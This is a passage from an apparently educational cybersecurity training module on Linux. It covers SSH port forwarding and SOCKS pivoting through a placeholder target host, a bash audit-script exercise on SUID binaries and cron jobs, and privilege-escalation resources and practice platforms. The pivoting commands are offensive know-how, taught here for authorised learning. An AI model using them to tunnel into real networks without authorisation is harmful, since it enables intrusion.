ssh -L 9000:localhost:3000 user@target_ip

# Now on Attacker — access the "internal" service:
curl http://localhost:9000
# You are accessing the target's localhost:3000 as if you were on the target machine

# Exercise 2: Dynamic SOCKS proxy
ssh -D 9050 user@target_ip
# Configure proxychains to use localhost:9050 SOCKS5
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf

# Route traffic through the tunnel
proxychains curl http://10.10.10.1  # Access internal network through target
```

### Exercise 5: Write a Bash Security Audit Script (1 hour)

Write a script that:
1. Identifies all users with UID 0
2. Finds all SUID binaries
3. Checks if `/etc/passwd` is world-writable
4. Lists all cron jobs for all users
5. Checks for writable files in service directories
6. Outputs results in a structured format with severity labels

Start from scratch, refer to this module for the commands, and make it produce clean output. The process of building it teaches you more than reading commands ever will.

---

## 16. Further Reading and Resources

### Essential Reading
- **"The Linux Command Line"** — William Shotts (available free at linuxcommand.org). The definitive beginner reference.
- **"Linux Basics for Hackers"** — OccupyTheWeb. Security-oriented Linux introduction, practical and direct.
- **"The Art of Unix Programming"** — Eric Raymond (available free online). Understand the philosophy that makes Linux work the way it does.

### Reference Sites
- **GTFOBins** (gtfobins.github.io) — SUID, sudo, and capability exploitation. Bookmark it permanently.
- **ExplainShell** (explainshell.com) — Paste any command, get visual explanation of every component
- **Linux man pages online** (man7.org/linux/man-pages) — Official documentation

### Privilege Escalation References
- **Linux Privilege Escalation Guide** — github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- **linpeas.sh** — github.com/carlospolop/PEASS-ng — automated Linux privesc checker
- **linux-exploit-suggester** — github.com/mzet-/linux-exploit-suggester

### Practice Platforms
- **OverTheWire: Bandit** (overthewire.org/wargames/bandit) — Start here. 34 levels of Linux fundamentals through progressive challenges. Free.
- **OverTheWire: Narnia** — Move here after Bandit. Basic binary exploitation on Linux.
- **TryHackMe** — "Linux Fundamentals" series (3 rooms, free), "Linux PrivEsc" room
- **HackTheBox** — Linux-based machines at every difficulty level
- **VulnHub** — Download vulnerable Linux VMs for offline practice

### Tools to Install
```bash
# Essential additions to your Kali/Ubuntu toolkit
sudo apt install -y \
    htop \           # Better process monitor
    tree \           # Visual directory tree
    net-tools \      # Legacy network tools (netstat, ifconfig)
    dnsutils \       # dig, nslookup
    curl wget \      # HTTP tools
    tmux \           # Terminal multiplexer — split screens, sessions
    vim nano \       # Text editors
    git \            # Version control
    python3-pip \    # Python package manager
    jq               # JSON processor

# Security-specific
sudo apt install -y \
    seclists \       # Wordlists (hundreds of MB)
    pspy            # Monitor processes without root — amazing for privilege escalation
```

---

## Module Summary

| Topic | Core Security Application |
|-------|--------------------------|
| Distributions | Kali = attack platform, know what runs in target environments |
| Terminal | Command composition, redirection, pipes — the efficiency foundation |
| Core Commands | grep + find = reconnaissance and evidence gathering |
| File Permissions | SUID/SGID/world-writable = privilege escalation checklist |
| User Management | /etc/passwd, /etc/shadow, sudo -l = post-exploitation enumeration |
| Package Management | Know your environment, install tools, understand trusted sources |
| Service Management | Service file permissions = privesc surface; service logs = evidence |
| Cron Jobs | Most common Linux persistence and privilege escalation vector |
| Bash Scripting | Automation, custom tools, post-exploitation scripts |
| Log System | auth.log = authentication forensics; log manipulation = attacker tradecraft |
| SSH | Tunnelling = pivoting foundation; hardening = server defence |
| FHS | Know where everything lives — /tmp for staging, /etc for config, /proc for intelligence |

---

> **Next Module:** [Stage 0.5 — Programming Fundamentals](./stage-0.5-programming-fundamentals.md)  
> **Previous Module:** [Stage 0.3 — Windows Fundamentals](./stage-0.3-windows-fundamentals.md)  
> **Series Index:** [Full Roadmap Index](./README.md)

---

*This document is part of the Cybersecurity × OT/ICS Security Full Roadmap series. All techniques are presented for educational purposes, authorised security research, and defensive security practice. Always obtain proper authorisation before testing any system.*